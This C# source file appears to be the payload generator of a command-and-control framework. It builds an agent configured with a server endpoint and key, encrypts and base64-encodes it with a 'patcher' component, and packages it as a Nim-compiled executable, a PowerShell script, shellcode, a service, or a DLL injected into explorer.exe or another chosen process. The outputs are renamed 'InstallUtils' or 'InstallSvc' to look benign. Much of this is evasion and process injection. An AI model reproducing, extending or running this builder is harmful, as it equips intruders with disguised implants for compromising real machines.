﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Common.Payload;
using Common.Config;

//public enum MessageLevel
//{
//    Default,
//    Verbose
//}

public partial class PayloadGenerator
{
    public const string AgentSrcFile = "Agent.exe";
    public const string StarterSrcFile = "Starter.exe";
    public const string ServiceSrcFile = "Service.exe";
    public const string PatcherSrcFile = "Patcher.dll";
    public const string InjectSrcFile = "Inject.dll";

    public const string NimExecScript = "Payload";

    public event EventHandler<string> MessageSent;

    public PayloadConfig Config = null;
    public SpawnConfig Spawn = null;


    public PayloadGenerator(PayloadConfig config, SpawnConfig spawn)
    {
        this.Config = config;
        this.Spawn = spawn;
    }

    private string Source(string fileName, PayloadArchitecture arch, bool debug)
    {
        if(debug)
            return Path.Combine(this.Config.SourceFolder, "debug", fileName);
        return Path.Combine(this.Config.SourceFolder, arch.ToString(), fileName);
    }

    private string Working(string fileName)
    {
        return Path.Combine(this.Config.WorkingFolder, fileName);
    }

    public byte[] GeneratePayload(PayloadGenerationOptions options)
    {
        byte[] agentbytes = null;
        if (options.IsInjected  && options.Type != PayloadType.Library)
        {
            agentbytes = PrepareAgent(options, false);
            agentbytes = PrepareInjectedAgent(options, agentbytes, options.Type == PayloadType.Service);
        }
        else
        {
            agentbytes = PrepareAgent(options, options.Type == PayloadType.Service);
        }

        switch (options.Type)
        {
            case PayloadType.Executable: return this.ExecutableEncapsulation(options, agentbytes);
            case PayloadType.PowerShell: return this.PowershellEncapsulation(options, agentbytes);
            case PayloadType.Library: return this.GenerateLibrary(options,agentbytes);
            case PayloadType.Service: return agentbytes;
            case PayloadType.Binary: return this.BinaryEncapsulation(options, agentbytes);
            default:
                throw new NotImplementedException();

        }
    }

    public byte[] ExecutableEncapsulation(PayloadGenerationOptions options, byte[] agent)
    {
        string nimSourceCode = string.Empty;
        string agentb64 = Convert.ToBase64String(agent);
        using (var nimReader = new StreamReader(this.Source("payload.nim", options.Architecture, options.IsDebug)))
        {
            nimSourceCode = nimReader.ReadToEnd();
        }

        var payload = new StringBuilder();
        foreach (var chunk in this.SplitIntoChunks(agentb64, 1000))
        {
            payload.Append("b64 = b64 & \"");
            payload.Append(chunk);
            payload.Append("\"");
            payload.Append(Environment.NewLine);
        }

        var nimFile = "tmp" + ShortGuid.NewGuid() + ".nim";
        nimSourceCode = nimSourceCode.Replace("[[PAYLOAD]]", payload.ToString());

        var nimPath = this.Working(nimFile);
        using (var writer = new StreamWriter(nimPath))
        {
            writer.WriteLine(nimSourceCode);
        }

        var outFile = "tmp" + ShortGuid.NewGuid() + ".exe";
        var outPath = this.Working(outFile);

        var parms = this.ComputeNimBuildParameters(nimPath, outPath, options.Architecture == PayloadArchitecture.x86, options.IsDebug);

        this.MessageSent?.Invoke(this, $"[>] Generating executable...");

        if (options.IsVerbose)
            this.MessageSent?.Invoke(this, $"[>] Executing: nim {string.Join(" ", parms)}");
        var executionResult = this.NimBuild(parms);

        if (options.IsVerbose)
            this.MessageSent?.Invoke(this, executionResult.Out);

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "Build succeed.");
            else
                this.MessageSent?.Invoke(this, "Build failed.");

        File.Delete(nimPath);

        if (executionResult.Result != 0)
            return null;

        byte[] bytes = File.ReadAllBytes(outPath);
        File.Delete(outPath);

        return bytes;
    }

    public byte[] BinaryEncapsulation(PayloadGenerationOptions options, byte[] agent)
    {
        var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
        var tmpPath = this.Working(tmpFile);
        File.WriteAllBytes(tmpPath, agent);

        var outFile = "tmp" + ShortGuid.NewGuid() + ".bin";
        var outPath = this.Working(outFile);

        this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
        var executionResult = this.GenerateBin(tmpPath, outPath, options.Architecture == PayloadArchitecture.x86);

        if (options.IsVerbose)
            this.MessageSent?.Invoke(this, executionResult.Out);

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "Build succeed.");
            else
                this.MessageSent?.Invoke(this, "Build failed.");

        
        File.Delete(tmpPath);
        if (executionResult.Result != 0)
            return null;

        byte[] bytes = File.ReadAllBytes(outPath);
        File.Delete(outPath);

        return bytes;
    }

    public byte[] GenerateLibrary(PayloadGenerationOptions options, byte[] agent)
    {
        if(!options.IsInjected)
        {
            this.MessageSent?.Invoke(this, $"[X] Only injected payload is allowed for Library type!");
            return null;
        }

        string nimSourceCode = string.Empty;

        var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
        var tmpPath = this.Working(tmpFile);
        File.WriteAllBytes(tmpPath, agent);

        var outFile = "tmp" + ShortGuid.NewGuid() + ".bin";
        var outPath = this.Working(outFile);

        this.MessageSent?.Invoke(this, $"[>] Generating Library...");
        if (options.IsVerbose)
            this.MessageSent?.Invoke(this, $"Generating Binary...");
        var executionResult = this.GenerateBin(tmpPath, outPath, options.Architecture == PayloadArchitecture.x86);

        if (options.IsVerbose)
            this.MessageSent?.Invoke(this, executionResult.Out);

        File.Delete(tmpPath);

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "Binary generated.");
            else
            {
                this.MessageSent?.Invoke(this, "Generation failed.");
                return null;
            }


        if (options.IsVerbose)
            this.MessageSent?.Invoke(this, $"Generating dll...");
        var dllFile = "tmp" + ShortGuid.NewGuid() + ".dll";
        var dllPath = this.Working(dllFile);

        var executionResultDll = this.GenerateDll(outPath, dllPath, "explorer.exe");

        File.Delete(outPath);

        if (options.IsVerbose)
            this.MessageSent?.Invoke(this, executionResultDll.Out);
        if (options.IsVerbose)
            if (executionResultDll.Result == 0)
                this.MessageSent?.Invoke(this, "Dll generated.");
            else
            {
                this.MessageSent?.Invoke(this, "Generation failed.");
                return null;
            }

        byte[] bytes = File.ReadAllBytes(dllPath);
        File.Delete(dllPath);

        return bytes;
    }

    public byte[] PowershellEncapsulation(PayloadGenerationOptions options, byte[] agent)
    {
        string psSourceCode = string.Empty;
        using (var psReader = new StreamReader(this.Source("payload.ps1", options.Architecture, options.IsDebug)))
        {
            psSourceCode = psReader.ReadToEnd();
        }

        //var payload = new StringBuilder();
        //foreach (var chunk in this.SplitIntoChunks(agentb64, 1000))
        //{
        //    payload.Append("b64 = b64 & \"");
        //    payload.Append(chunk);
        //    payload.Append("\"");
        //    payload.Append(Environment.NewLine);
        //}
        //File.WriteAllBytes("/mnt/Share/tmp/full.exe", agent);

        var payload = this.Encode(agent);

        var psFile = "tmp" + ShortGuid.NewGuid() + ".ps1";
        psSourceCode = psSourceCode.Replace("[[PAYLOAD]]", payload.ToString());

        var psPath = this.Working(psFile);
        using (var writer = new StreamWriter(psPath))
        {
            writer.WriteLine(psSourceCode);
        }

        byte[] bytes = File.ReadAllBytes(psPath);


        File.Delete(Path.Combine(this.Config.WorkingFolder, psPath));


        return bytes;
    }

    public byte[] PrepareAgent(PayloadGenerationOptions options, bool isService)
    {
        //Console.WriteLine("Generating encrypted Agent");

        this.MessageSent?.Invoke(this, $"Configuring Agent...");
        byte[] agent = LoadAssembly(this.Source(AgentSrcFile, options.Architecture, options.IsDebug));

        this.MessageSent?.Invoke(this, $"Using Endpoint {options.Endpoint}...");
        this.MessageSent?.Invoke(this, $"Using ServerKey {options.ServerKey}...");

        agent = AssemblyEditor.ReplaceRessources(agent, new Dictionary<string, object>()
        {
            { "EndPoint", options.Endpoint.ToString() },
            { "Key", options.ServerKey ?? String.Empty }
        });

        //File.WriteAllBytes("/mnt/Share/tmp/justAgent.exe", agent);


        this.MessageSent?.Invoke(this, $"Encrypting Agent...");
        var encAgent = this.Encrypt(agent);
        var agentb64 = this.Encode(encAgent.Encrypted);


        this.MessageSent?.Invoke(this, $"Creating Patcher...");
        //Create Patcher
        var patchDll = LoadAssembly(this.Source(PatcherSrcFile, options.Architecture, options.IsDebug));

        var encPatcher = this.Encrypt(patchDll);
        var patcherb64 = this.Encode(encPatcher.Encrypted);

        if (!isService)
        {
            this.MessageSent?.Invoke(this, $"Creating Starter...");
            //Create Starter
            var starter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture, options.IsDebug));
            starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
                    {
                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                        { "PatchKey", encPatcher.Secret },
                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
                        { "Key", encAgent.Secret }
                    });
            var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
            return resultAgent;
        }
        else
        {
            this.MessageSent?.Invoke(this, $"Creating Service...");
            //Create Starter
            var service = LoadAssembly(this.Source(ServiceSrcFile, options.Architecture, options.IsDebug));
            service = AssemblyEditor.ReplaceRessources(service, new Dictionary<string, object>()
                    {
                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                        { "PatchKey", encPatcher.Secret },
                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
                        { "Key", encAgent.Secret }
                    });
            var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
            return resultAgent;
        }
    }

    public byte[] PrepareInjectedAgent(PayloadGenerationOptions options, byte[] agent, bool isService)
    {
        #region binary
        var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
        var tmpPath = this.Working(tmpFile);
        File.WriteAllBytes(tmpPath, agent);

        var outFile = "tmp" + ShortGuid.NewGuid() + ".bin";
        var outPath = this.Working(outFile);

        this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
        var executionResult = this.GenerateBin(tmpPath, outPath, options.Architecture == PayloadArchitecture.x86);

        if (options.IsVerbose)
            this.MessageSent?.Invoke(this, executionResult.Out);

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "[*] Binary generation succeed.");
            else
                this.MessageSent?.Invoke(this, "[X] Binary generation failed.");

        File.Delete(tmpPath);
        if (executionResult.Result != 0)
            return null;

        var binBytes = File.ReadAllBytes(outPath); //binary
        File.Delete(outPath);
        #endregion


        #region Injector
        var patchDll = LoadAssembly(this.Source(PatcherSrcFile, options.Architecture, options.IsDebug));
        var encPatcher = this.Encrypt(patchDll);
        var patcherb64 = this.Encode(encPatcher.Encrypted);

        this.MessageSent?.Invoke(this, $"BinLength = {binBytes.Length}");

        var injDll = LoadAssembly(this.Source(InjectSrcFile, options.Architecture, options.IsDebug));

        string process = options.Architecture == PayloadArchitecture.x64 ? this.Spawn.SpawnToX64 : this.Spawn.SpawnToX86;
        if(!string.IsNullOrEmpty(options.InjectionProcess))
            process = options.InjectionProcess;

        injDll = AssemblyEditor.ReplaceRessources(injDll, new Dictionary<string, object>()
                    {
                        { "Payload", binBytes },
                        { "Host",  process},
                        { "Delay", options.InjectionDelay.ToString() },
                    });

        var encInject = this.Encrypt(injDll);
        var injectb64 = this.Encode(encInject.Encrypted);

        if (!isService)
        {
            this.MessageSent?.Invoke(this, $"Creating Starter...");
            //Create Starter
            var starter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture, options.IsDebug));
            starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
                    {
                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                        { "PatchKey", encPatcher.Secret },
                        { "Payload", Encoding.UTF8.GetBytes(injectb64) },
                        { "Key", encInject.Secret }
                    });
            var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
            return resultAgent;
        }
        else
        {
            this.MessageSent?.Invoke(this, $"Creating Service...");
            //Create Starter
            var service = LoadAssembly(this.Source(ServiceSrcFile, options.Architecture, options.IsDebug));
            service = AssemblyEditor.ReplaceRessources(service, new Dictionary<string, object>()
                    {
                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                        { "PatchKey", encPatcher.Secret },
                        { "Payload", Encoding.UTF8.GetBytes(injectb64) },
                        { "Key", encInject.Secret }
                    });
            var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
            return resultAgent;
        }

        #endregion

    }

    private byte[] LoadAssembly(string filePath)
    {
        return File.ReadAllBytes(filePath);
    }

    private EncryptResult Encrypt(string filePath)
    {
        var fileContent = File.ReadAllBytes(filePath);
        return this.Encrypt(fileContent);
    }

    private EncryptResult Encrypt(byte[] bytes)
    {
        return new Encrypter().Encrypt(bytes);
    }

    private string Encode(byte[] bytes)
    {
        return Convert.ToBase64String(bytes); ;
    }
}
